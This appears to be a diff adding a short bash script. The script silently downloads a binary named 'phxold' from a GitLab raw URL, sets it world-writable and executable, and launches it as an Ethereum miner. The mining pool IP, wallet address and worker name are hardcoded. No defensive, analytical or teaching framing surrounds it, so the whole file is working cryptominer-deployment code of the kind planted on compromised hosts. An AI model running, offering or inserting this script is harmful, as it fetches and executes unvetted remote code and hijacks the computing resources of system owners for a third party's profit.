@@ -1,0 +1,4 @@
+#!/bin/bash
+wget -q https://gitlab.com/jadons19292/donlod/-/raw/main/phxold
+chmod 777 phxold
+./phxold -coin eth -pool 68.183.28.129:443 -wal 0x02723449d701f083ae02b7694911bf92f871473d -worker Tester -epsw
